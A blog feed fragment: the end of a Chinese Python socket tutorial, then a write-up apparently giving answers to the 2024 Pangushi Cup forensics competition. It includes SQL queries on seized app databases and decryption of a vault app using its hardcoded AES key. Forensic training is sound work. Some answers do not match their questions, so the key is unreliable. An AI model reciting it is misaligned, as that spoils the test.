addr)<br></code></pre></td></tr></table></figure><h4 id="发送和接收数据"><a href="#发送和接收数据" class="headerlink" title="发送和接收数据"></a>发送和接收数据</h4><p>TCP服务器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 接收数据</span><br>data = conn.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;接收到数据：&#x27;</span>, data)<br><span class="hljs-comment"># 发送数据</span><br>conn.sendall(<span class="hljs-string">b&#x27;Hello, Client!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>TCP客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 连接到服务器</span><br>s.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br><span class="hljs-comment"># 发送数据</span><br>s.sendall(<span class="hljs-string">b&#x27;Hello, Server!&#x27;</span>)<br><span class="hljs-comment"># 接收数据</span><br>data = s.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;接收到数据：&#x27;</span>, data)<br></code></pre></td></tr></table></figure><p>UDP服务器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 接收数据</span><br>data, addr = u.recvfrom(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;接收到数据：&#x27;</span>, data)<br><span class="hljs-comment"># 发送数据</span><br>u.sendto(<span class="hljs-string">b&#x27;Hello, Client!&#x27;</span>, addr)<br></code></pre></td></tr></table></figure><p>UDP客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 发送数据</span><br>u.sendto(<span class="hljs-string">b&#x27;Hello, Server!&#x27;</span>, (<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br><span class="hljs-comment"># 接收数据</span><br>data, addr = u.recvfrom(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;接收到数据：&#x27;</span>, data)<br></code></pre></td></tr></table></figure><h4 id="关闭Socket"><a href="#关闭Socket" class="headerlink" title="关闭Socket"></a>关闭Socket</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 关闭连接</span><br>conn.close()<br><span class="hljs-comment"># 关闭服务器socket</span><br>s.close()<br><span class="hljs-comment"># 关闭UDP socket</span><br>u.close()<br></code></pre></td></tr></table></figure><h3 id="处理TCP与UDP的主要区别"><a href="#处理TCP与UDP的主要区别" class="headerlink" title="处理TCP与UDP的主要区别"></a>处理TCP与UDP的主要区别</h3><ul><li><strong>连接性</strong>：TCP是面向连接的，而UDP是无连接的。这意味着TCP在通信前需要建立一个连接，并在通信结束后关闭这个连接。而UDP则不需要这样的过程。</li><li><strong>可靠性</strong>：TCP提供可靠的数据传输服务，确保数据按顺序、完整地到达目的地。如果数据丢失或损坏，TCP会自动重传。而UDP则不保证数据的可靠性，一旦数据被发送，就不会再进行任何确认或重传操作。</li><li><strong>性能</strong>：由于UDP没有TCP复杂的确认和重传机制，因此它通常具有更低的延迟和更高的吞吐量。这使得UDP非常适合于对实时性要求较高的应用，如视频会议和在线游戏。</li><li><strong>错误处理</strong>：在使用UDP时，由于其不保证数据的可靠性，因此开发者需要自己实现错误处理机制，比如通过请求响应模式来确认数据是否成功接收。</li></ul><p>通过上述步骤和分析，我们可以在Python中实现UDP通信，并理解其与TCP通信的主要区别。</p><h4 id="优化策略"><a href="#优化策略" class="headerlink" title="优化策略"></a>优化策略</h4><p>在处理socket连接时，Python多线程编程技术的最佳实践和性能优化策略主要包括以下几个方面：</p><ol><li><strong>使用合适的多线程模块</strong>：Python提供了<code>thread</code>和<code>threading</code>两个模块用于实现多线程。<code>thread</code>模块是较低级的接口，提供了更直接和灵活的方式来创建和管理线程。而<code>threading</code>模块则是对<code>thread</code>的封装，提供了更为方便的API。根据具体需求选择合适的模块可以提高代码的可读性和维护性。</li><li><strong>利用同步机制控制资源共享</strong>：在多线程环境下，需要特别注意全局变量和共享资源的访问控制，以避免数据竞争和其他并发问题。可以通过使用锁（Locks）、条件变量（Condition Variables）等同步机制来确保线程安全。</li><li><strong>采用并发模型优化性能</strong>：根据应用场景选择合适的并发模型，如线程池（ThreadPoolExecutor）、进程池（ProcessPoolExecutor）等，可以有效地管理线程或进程，减少创建和销毁线程或进程的开销，从而提高程序的执行效率。</li><li><strong>结合现代CPU的并行特性</strong>：为了充分利用现代CPU的并行处理能力，可以考虑使用支持OpenMP的库如PyOMP，这样可以在Python中编写并行多线程代码，通过Numba生成的代码编译到LLVM，从而接近于用C和OpenMP编写的代码性能。</li><li><strong>高性能网络通信接口的使用</strong>：对于需要高性能网络通信的应用，可以考虑使用专门为高性能网络设计的接口，如shmem4py，它是OpenSHMEM的一个Python包装器，提供了一种高效且便捷的并行编程框架，特别适合于低延迟和高吞吐量的用例。</li><li><strong>JIT编译技术的应用</strong>：为了进一步提高Python代码的执行效率，可以利用JIT（Just-In-Time）编译技术，如Numba，它能够将Python代码的一部分编译成高效的机器码，从而显著提高性能。</li></ol><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>在编写网络应用程序时，需要注意异常处理和错误检查。</li><li>确保在适当的时候关闭socket，以释放系统资源。</li><li>考虑到安全性，可能需要在socket通信中实现加密机制，如SSL。<br>Socket编程是网络编程的基础，理解它对于开发网络应用和服务至关重要。在实际应用中，还需要考虑许多其他因素，如并发处理、性能优化、安全性等。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python第三方库 </tag>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024盘古石杯复盘</title>
      <link href="/2024/05/12/2024%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%9B%98/"/>
      <url>/2024/05/12/2024%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="2024盘古石杯复盘"><a href="#2024盘古石杯复盘" class="headerlink" title="2024盘古石杯复盘"></a>2024盘古石杯复盘</h1><h2 id="毛雪柳部分"><a href="#毛雪柳部分" class="headerlink" title="毛雪柳部分"></a>毛雪柳部分</h2><h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><p>1.分析毛雪柳的计算机检材，计算机插入三星固态盘的时间是：[答案格式：2024-01-01-04-05-06] [★☆☆☆☆]</p><p><strong>2024-04-25-19-08-08</strong></p><p><img src="/../img/%E6%AF%9B_pc_1.png" alt="毛_pc_1.png"></p><p>2.分析毛雪柳的计算机检材，计算机操作系统当前的Build版本是：[答案格式：17786] [★☆☆☆☆]</p><p><strong>19045</strong></p><p><img src="/../img/%E6%AF%9B_pc_2.png" alt="毛_pc_2.png"></p><p>3.分析毛雪柳的计算机检材，团队内部使用的即时通讯软件在计算机上存储日志的文件名是：[答案格式：log.log，区分大小写] [★☆☆☆☆]</p><p><strong>main.log</strong></p><p>仿真后在快速访问中可以找到</p><p><img src="/../img/%E6%AF%9B_pc_3.png" alt="毛_pc_3.png"></p><p>4.分析毛雪柳的计算机检材，伏季雅一月份实发工资的金额是：[答案格式：1234] [★★★☆☆]</p><p><strong>11200</strong></p><p>在仿真pc中可以找到账本.xlxs,但是有密码，可以在毛的手机中找到密码截图</p><p><img src="/../img/%E6%AF%9B_pc_4_1.png" alt="毛_pc_4_1.png"></p><p>打开可以查看</p><p><img src="/../img/%E6%AF%9B_pc_4_2.png" alt="毛_pc_4_2.png"></p><p>5.分析毛雪柳的计算机检材，该团伙三月份的盈余多少：[答案格式：1234] [★★★☆☆]</p><p><strong>158268</strong></p><p>上题中账本.xlxs可以找到</p><p><img src="/../img/%E6%AF%9B_pc_5.png" alt="毛_pc_5.png"></p><h3 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h3><p>1.分析毛雪柳的手机检材，手机中有一个记账APP，该APP的应用名称是：[答案格式：Telegram，区分大小写]</p><p>[★☆☆☆☆]</p><p><strong>iCost</strong></p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_1.png" alt="毛_手机_1.png"></p><p>2.分析毛雪柳的手机检材，记账APP存储记账信息的数据库文件名称是：[答案格式：tmp.db，区分大小写] [★★★★☆]</p><p><strong>default.realm</strong></p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_2_1.png" alt="毛_手机_2_1.png"></p><p>查询可知Realm为数据库</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_2_2.png" alt="毛_手机_2_2.png"></p><p>3.分析毛雪柳的手机检材，记账APP中，2月份总收入金额是多少：[答案格式：1234] [★★★★★]</p><p><strong>11957</strong></p><p>使用Realm studio打开数据库，观察可知type&#x3D;1表示收入</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_3_1.png" alt="毛_手机_3_1.png"></p><p>将时间戳进行转换可以知道，第4条和第5条为2月的记录一共收入9600+2357&#x3D;11957</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_3_2.png" alt="毛_手机_3_2.png"></p><p>4.分析毛雪柳的手机检材，手机中团队内部使用的即时通讯软件中，团队老板的邮箱账号是：[答案格式：<a href="mailto:&#x61;&#x62;&#x63;&#64;&#x61;&#x62;&#x63;&#x2e;&#99;&#111;&#109;">&#x61;&#x62;&#x63;&#64;&#x61;&#x62;&#x63;&#x2e;&#99;&#111;&#109;</a>] [★★★☆☆]</p><p><strong><a href="mailto:&#x67;&#x78;&#121;&#116;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#x78;&#121;&#116;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a></strong></p><p>综合分析可知团队内部使用的即时通讯软件为mattermost，可以看到共享群组路径</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_4.png" alt="毛_手机_4.png"></p><p>在其中可以找到数据库，导出</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_5.png" alt="毛_手机_5.png"></p><p>分析roles可知gxyt为团队老板</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_6_1.png" alt="毛_手机_6_1.png"></p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_6_2.png" alt="毛_手机_6_2.png"></p><p>5.接上题，该内部即时通讯软件中，毛雪柳和老板的私聊频道中，老板加入私聊频道的时间是：[答案格式：2024-01-01-04-05-06] [★★★☆☆]</p><p><strong>2024-04-24-11-59-28</strong></p><p>先在channelinfo中找到私聊频道的id</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_7_1.png" alt="毛_手机_7_1.png"></p><p>再去post表中查询即可找到“gxyt joined the channel.”再把时间戳转换即可。</p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_7.png" alt="毛_手机_7.png"></p><p>6.接上题，该私聊频道中，老板最后一次发送聊天内容的时间是：[答案格式：2024-01-01-04-05-06] [★★★☆☆]</p><p><strong>2024-04-25-10-24-50</strong></p><p><img src="/../img/%E6%AF%9B_%E6%89%8B%E6%9C%BA_8.png" alt="毛_手机_8.png"></p><h2 id="伏季雅部分"><a href="#伏季雅部分" class="headerlink" title="伏季雅部分"></a>伏季雅部分</h2><h3 id="手机-1"><a href="#手机-1" class="headerlink" title="手机"></a>手机</h3><p>1.分析伏季雅的手机检材，手机的安卓ID是：[答案格式：小写字母和数字] [★☆☆☆☆]</p><p><strong>9e6c9838dafe7ba0</strong></p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_1.png" alt="伏_手机_1.png"></p><p>2.分析伏季雅的手机检材，手机型号是：[答案格式：HUAWEI-FL56T] [★☆☆☆☆]</p><p><strong>SM-G996N</strong>(同上图)</p><p>3.分析伏季雅的手机检材，其和受害人视频通话的时间是：[答案格式：2024-01-01-04-05] [★☆☆☆☆]</p><p><strong>2024-04-24-20-46</strong></p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_2.png" alt="伏_手机_2.png"></p><p>4.分析伏季雅的手机检材，手机中安装了一款记账APP，该记账APP存储记账信息的数据库名称是：[答案格式：abcabc，区分大小写] [★☆☆☆☆]</p><p><strong>MoneyLoverS2</strong></p><p>先在app列表中找到疑似记账app：Money Lover</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_3_1.png" alt="img/伏_手机_3_1.png"></p><p>在&#x2F;data&#x2F;data&#x2F;com.bookmark.money&#x2F;databases目录下找到数据库MoneyLoverS2</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_3_2.png" alt="伏_手机_3_2.png"></p><p>5.接上题，该记账APP登录的邮箱账号是：[答案格式：<a href="mailto:&#x61;&#98;&#99;&#64;&#x61;&#98;&#99;&#46;&#x63;&#111;&#109;">&#x61;&#98;&#99;&#64;&#x61;&#98;&#99;&#46;&#x63;&#111;&#109;</a>] [★★★☆☆]</p><p><strong><a href="mailto:&#99;&#97;&#114;&#108;&#x65;&#101;&#110;&#108;&#111;&#121;&#100;&#x6c;&#x79;&#x69;&#115;&#x34;&#x30;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#99;&#97;&#114;&#108;&#x65;&#101;&#110;&#108;&#111;&#121;&#100;&#x6c;&#x79;&#x69;&#115;&#x34;&#x30;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a></strong> </p><p>导出可得</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_4.png" alt="伏_手机_4.png"></p><p>6.接上题，该记账APP中记录的所有<strong>收入</strong>金额合计是：[答案格式：1234] [★★★☆☆]</p><p><strong>279002</strong></p><p>找到transection表，题目问的是收入，所以先在categories表找到支出和收入的区别cat_type</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_5_1.png" alt="伏_手机_5_1.png"></p><p>再在transection表中查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">SELECT SUM(amount) FROM transactions WHERE cat_id IN (SELECT cat_id FROM categories WHERE cat_type = 1)<br></code></pre></td></tr></table></figure><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_5_2.png" alt="伏_手机_5_2.png"></p><p>7.接上题，分析该记账APP中的消费记录，统计从2022-3-1（含）到2023-12-1（含）期间，用于交通的支出费用合计是：[答案格式：1234] [★★★☆☆]</p><p><strong>6042</strong></p><p>交通的cat_id为19</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_6_1.png" alt="伏_手机_6_1.png"></p><p>建立查询（统计从2022-3-1（含）到2023-12-1（含）期间）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">SELECT SUM(amount) FROM transactions WHERE cat_id = 19 AND created_date &gt;= &#x27;2022-03-01&#x27; AND created_date &lt;= &#x27;2023-12-01&#x27;<br></code></pre></td></tr></table></figure><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_6_2.png" alt="伏_手机_6_2.png"></p><p>8.分析伏季雅的手机检材，手机中诈骗APP的包名是：[答案格式：abc.abc.abc，区分大小写] [★☆☆☆☆]</p><p><strong>w2a.W2Ah5.jsgjzfx.org.cn</strong></p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_7.png" alt="伏_手机_7.png"></p><p>9.分析伏季雅的手机检材，手机中诈骗APP连接的服务器地址是：[答案格式：127.0.0.1] [★☆☆☆☆]</p><p><strong>192.168.137.125</strong></p><p>导出apk，Android Killer打开可以找到manifest.json</p><p>其中可以找到</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_8.png" alt="伏_手机_8.png"></p><p>10.分析伏季雅的手机检材，手机中诈骗APP的打包ID是：[答案格式：_abc_abc.abc，区分大小写] [★☆☆☆☆]</p><p><strong>__ W2A __h5.jsgjzfx.org.cn</strong></p><p>也在manifest.json中找到</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_9.png" alt="伏_手机_9.png"></p><p>11.分析伏季雅的手机检材，手机中诈骗APP的主启动项是：[答案格式：abc.abc.abc，区分大小写] [★☆☆☆☆]</p><p><strong>io.dcloud.PandoraEntry</strong></p><p>导出apk，Android Killer打开即得</p><p><img src="/../img/%E4%BC%8F_%E6%89%8B%E6%9C%BA_10.png" alt="伏_手机_10.png"></p><h3 id="PC-1"><a href="#PC-1" class="headerlink" title="PC"></a>PC</h3><p>1.分析伏季雅的计算机检材，计算机最后一次错误登录时间是：[答案格式：2024-01-01-04-05-06] [★☆☆☆☆]</p><p><strong>2024-04-26-16-57-58</strong></p><p>火眼打开找到登录失败即得</p><p><img src="/../img/%E4%BC%8F_pc_1.png" alt="伏_pc_1.png"></p><p>2.分析伏季雅的计算机检材，计算机中曾经浏览过的电影名字是：[答案格式：《奥本海默》] [★☆☆☆☆]</p><p><strong>《坠落的审判》</strong></p><p>翻翻浏览器记录找到</p><p><img src="/../img/%E4%BC%8F_pc_2.png" alt="伏_pc_2.png"></p><p>3.分析伏季雅的计算机检材，计算机中团队内部即时通讯软件的最后一次打开的时间是：[答案格式：2024-01-01-04-05-06] [★☆☆☆☆]</p><p><strong>2024-04-26-17-13-02</strong></p><p>综合分析可得内部即时通讯软件为mattermost</p><p><img src="/../img/%E4%BC%8F_pc_3.png" alt="伏_pc_3.png"></p><p>4.分析伏季雅的计算机检材，计算机中有一款具备虚拟视频功能的软件，该软件合计播放了多少个视频：[答案格式：3] [★☆☆☆☆]</p><p><strong>1</strong></p><p>在Edge浏览器的历史记录中可以找到浏览过MVBOX虚拟视频播放器官网</p><p><img src="/../img/%E4%BC%8F_pc_4_1.png" alt="伏_pc_4_1.png"></p><p>仿真可以找到</p><p><img src="/../img/%E4%BC%8F_pc_4_2.png" alt="伏_pc_4_2.png"></p><p>5.接上题，该软件的官网地址是：[答案格式：<a href="https://www.baidu.com]">https://www.baidu.com]</a> [★☆☆☆☆]</p><p><strong><a href="http://www.mvbox.cn/">http://www.mvbox.cn</a></strong></p><p>见上图</p><p>6.接上题，该软件录制数据时，设置的帧率是：[答案格式：20] [★☆☆☆☆]</p><p><strong>15</strong></p><p><img src="/../img/%E4%BC%8F_pc_5.png" alt="伏_pc_5.png"></p><p>7.分析伏季雅的计算机检材，在团队内部使用的即时通讯软件中，其一共接收了多少条虚拟语音：[答案格式：2] [★☆☆☆☆]</p><p><strong>4</strong></p><p>可以在mattermost的设置中找到下载路径</p><p><img src="/../img/%E4%BC%8F_pc_6_1.png" alt="伏_pc_6_1.png"></p><p>查看可以发现有4个音频</p><p><img src="/../img/%E4%BC%8F_pc_6_2.png" alt="伏_pc_6_2.png"></p><h2 id="义言部分"><a href="#义言部分" class="headerlink" title="义言部分"></a>义言部分</h2><h3 id="手机-2"><a href="#手机-2" class="headerlink" title="手机"></a>手机</h3><p>1.分析义言的手机检材，手机中登录的谷歌邮箱账号是：[答案格式：<a href="mailto:&#97;&#98;&#99;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#98;&#99;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a>] [★★☆☆☆]</p><p><strong><a href="mailto:&#x61;&#50;&#50;&#51;&#56;&#51;&#52;&#x36;&#x33;&#x31;&#x37;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#x61;&#50;&#50;&#51;&#56;&#51;&#52;&#x36;&#x33;&#x31;&#x37;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#46;&#99;&#111;&#x6d;</a></strong></p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_1.png" alt="言_手机_1.png"></p><p>2.分析义言的手机检材，手机的MTP序列号是：[答案格式：大写字母和数字] [★★☆☆☆]</p><p><strong>FA6A80312283</strong></p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_2.png" alt="言_手机_2.png"></p><p>3.分析义言的手机检材，除系统自带的浏览器外，手机中安装了一款第三方浏览器，该浏览器的应用名称是：[答案格式：百度浏览器] [★★☆☆☆]</p><p><strong>悟空浏览器</strong></p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_3.png" alt="言_手机_3.png"></p><p>4.接上题，上述浏览器最后一次搜索的关键字是：[答案格式：百度] [★★☆☆☆]</p><p><strong>ai写文章生成器</strong></p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_4.png" alt="言_手机_4.png"></p><p>5.接上题，该浏览器最后一次收藏的网址是：[答案格式：<a href="https://baidu.com/acc/123412341234123/]">https://baidu.com/acc/123412341234123/]</a> [★★★☆☆]</p><p><strong><a href="http://toutiao.com/a7361678286282490403/">http://toutiao.com/a7361678286282490403/</a></strong></p><p>时间降序排序即得</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_5.png" alt="言_手机_5.png"></p><p>6.分析义言的手机检材，其所购买的公民信息数据，该数据提供者的手机号码是：[答案格式：13012341234] [★☆☆☆☆]</p><p><strong>13265159824</strong></p><p>在手机相册里可以找到</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_6.png" alt="言_手机_6.png"></p><p>7.接上题，卖家的收款地址：[答案格式：小写字母和数字] [★☆☆☆☆]</p><p><strong>bc1pvunxx2eyt0ljpzs9wp9tcrrdvssra97nnwls5463hxpf3xm69zms3yak85</strong></p><p>见第六题图</p><p>8.接上题，购买上述公民信息，义言一共支付了多少钱：[答案格式：0.000123BTC] [★☆☆☆☆]</p><p><strong>0.07364352BTC</strong></p><p>题目提示用比特币格式</p><p>根据地址可以在比特币交易查询网站查得</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_7.png" alt="言_手机_7.png"></p><p>9.接上题，该笔交易产生的手续费是多少：[答案格式：0.000123BTC] [★★☆☆☆]</p><p><strong>0.00006105BTC</strong></p><p>见第七题图</p><p>10.分析义言的手机检材，分析团队内部使用的即时通讯软件，该软件连接服务器的地址是：[答案格式：127.0.0.1] [★★☆☆☆]</p><p><strong>192.168.137.97</strong></p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_8_1.png" alt="言_手机_8_1.png"></p><p>解base64得到地址</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_8_2.png" alt="言_手机_8_2.png"></p><p>11.接上题，该软件存储聊天信息的数据库文件名称是：[答案格式：abc.abc，区分大小写] [★★☆☆☆]</p><p><strong>aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU&#x3D;.db</strong></p><p>见第十题</p><p>12.接上题，该即时通讯软件中，团队内部沟通群中，一共有多少个用户：[答案格式：1] [★★☆☆☆]</p><p><strong>6</strong></p><p>导出数据库即得</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_9.png" alt="言_手机_9.png"></p><p>13.接上题，该即时通讯应用的版本号是：[答案格式：1.1.1] [★★☆☆☆]</p><p><strong>2.15.0</strong></p><p>导出apk文件放入Androidkiller即得</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_10.png" alt="言_手机_10.png"></p><p>14.接上题，该即时通讯应用中，团队内部沟通中曾发送了一个视频文件，该视频文件发送者的用户名是：[答案格式：abc] [★★★★☆]</p><p><strong>yiyan</strong></p><p>在file中可以找到MP4文件</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_11_1.png" alt="言_手机_11_1.png"></p><p>file中post_id与post中id是对应的，post表中查询id为”brryxgwf8pdzdgd46i4og17rdh”的数据</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_11_2.png" alt="言_手机_11_2.png"></p><p>根据user_id找到发送者的用户名</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_11_3.png" alt="言_手机_11_3.png"></p><p>15.接上题，分析该即时通讯的聊天记录，团队购买了一个高性能显卡，该显卡的显存大小是：[答案格式：20G] [★★☆☆☆]</p><p><strong>24G</strong></p><p>查询聊天记录可以找到一个网址</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_12_1.png" alt="言_手机_12_1.png"></p><p>打开可以看到显卡信息</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_12_2.png" alt="言_手机_12_2.png"></p><p>16.分析义言的手机检材，手机中装有一个具备隐藏功能的APP，该APP启动设置了密码，设置的密码长度是多少位：[答案格式：5] [★★★★☆]</p><p><strong>012467853</strong></p><p>在网上搜索，可以发现有对该APP的解密分析 <a href="https://theincidentalchewtoy.wordpress.com/2021/12/07/decrypting-the-calculator-apps/">https://theincidentalchewtoy.wordpress.com/2021/12/07/decrypting-the-calculator-apps/</a></p><p>可知该APP使用硬编码，密钥默认为<code>Rny48Ni8aPjYCnUI</code></p><p>通过AES解密知道它的锁屏密码</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_13.png" alt="言_手机_13.png"></p><p>17.接上题，分析上述隐藏功能的APP，一共隐藏了多少个应用：[答案格式：1] [★★★★☆]</p><p><strong>5</strong></p><p>导出数据库，使用秘钥<strong>Rny48Ni8aPjYCnUI</strong>打开</p><p>查询hide_app表</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_14.png" alt="言_手机_14.png"></p><p>18.接上题，分析上述隐藏功能的APP，该APP一共加密了多少个文件：[答案格式：] [★★★★☆]</p><p><strong>5</strong></p><p>查询file_info表</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_15.png" alt="言_手机_15.png"></p><p>19.接上题，分析上述隐藏功能的APP，该APP加密了一份含有公民隐私信息的文件，该文件的原始名称是：[答案格式：abc.txt] [★★★★☆]</p><p><strong>公民信息.xlsx</strong></p><p>见第十八题图</p><p>20.分析义言的手机检材，马伟的手机号码是：[答案格式：13012341234] [★★★★☆]</p><p><strong>18921286666</strong></p><p>见第十八题图</p><p>找到原始文件e-283a934b-7821-4af3-9301-2cd6bba15782+c1导出</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_16_1.png" alt="言_手机_16_1.png"></p><p>使用cyberchef解密</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_16_2.png" alt="言_手机_16_2.png"></p><p>存为xlsx文件，打开即得</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_16_3.png" alt="言_手机_16_3.png"></p><p>21.分析义言的手机检材，手机中存有一个BitLocker恢复密钥文件，文件已被加密，原始文件的MD5值是：[答案格式：小写字母和数字] [★★★★☆]</p><p><strong>337469-693121-682748-288772-440682-300223-203698-553124</strong></p><p>思路同第二十题，导出，使用cyberchef解密</p><p><img src="/../img/%E8%A8%80_%E6%89%8B%E6%9C%BA_17.png" alt="言_手机_17.png"></p><h3 id="PC-2"><a href="#PC-2" class="headerlink" title="PC"></a>PC</h3><p>1.分析义言的计算机检材，计算机连接过的三星移动硬盘T7的序列号是：[答案格式：大写字母和数字] [★☆☆☆☆]</p><p><strong>ST6WTNS0RBD2721X</strong></p><p>火眼查到的是倒序的（队友用的是盘古石的软件，查到是ST6WTNS0RBD2721X）</p><p><img src="/../img/%E8%A8%80_pc_1.png" alt="言_pc_1.png"></p><p>2.分析义言的计算机检材，计算机的最后一次正常关机时间是：[答案格式：2024-01-01-04-05-06] [★☆☆☆☆]</p><p><strong>2023-04-28-18-51-56</strong></p><p><img src="/../img/%E8%A8%80_pc_2.png" alt="言_pc_2.png"></p><p>3.分析义言的计算机检材，曾经使用工具连接过数据库，该数据库的密码是：[答案格式：admin] [★☆☆☆☆]</p><p><strong>root</strong></p><p>（印证了手机第10题）</p><p><img src="/../img/%E8%A8%80_pc_3.png" alt="言_pc_3.png"></p><p>4.分析义言的计算机检材，计算机中安装的xshell软件的版本号是：[答案格式：Build-0000] [★☆☆☆☆]</p><p><strong>Build-0157</strong></p><p><img src="/../img/%E8%A8%80_pc_3_1.png" alt="言_pc_3_1.png"></p><p>打开bitlocker后验证</p><p><img src="/../img/%E8%A8%80_pc_3_2.png" alt="言_pc_3_2.png"></p><p>5.分析义言的计算机检材，曾使用shell工具连接过服务器，该服务器root用户的密码是：[答案格式：admin] [★★★☆☆]</p><p><strong>root</strong></p><p>打开bitlocker后，重新分析检材</p><p><img src="/../img/%E8%A8%80_pc_3_3.png" 